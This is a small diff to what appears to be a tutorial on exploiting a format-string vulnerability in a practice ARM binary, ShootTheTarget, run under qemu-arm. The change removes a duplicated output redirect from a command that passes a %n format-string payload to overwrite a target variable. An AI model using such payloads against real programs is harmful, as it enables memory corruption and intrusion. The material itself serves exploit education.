@@ -221,7 +221,7 @@ $ arm-none-linux-gnueabihf-readelf -a ShootTheTarget | grep target
 Now we can overwrite the target like this.
 
 ```sh
-$ ./ShootTheTarget qemu-arm ./ShootTheTarget '%466436.0s%.0s%.0s%.0s%.0s%.0s%.0s%n%7$n' >/dev/null >/dev/null
+$ ./ShootTheTarget qemu-arm ./ShootTheTarget '%466436.0s%.0s%.0s%.0s%.0s%.0s%.0s%n%7$n' >/dev/null
 
 Not quite...
 Target = 1e04
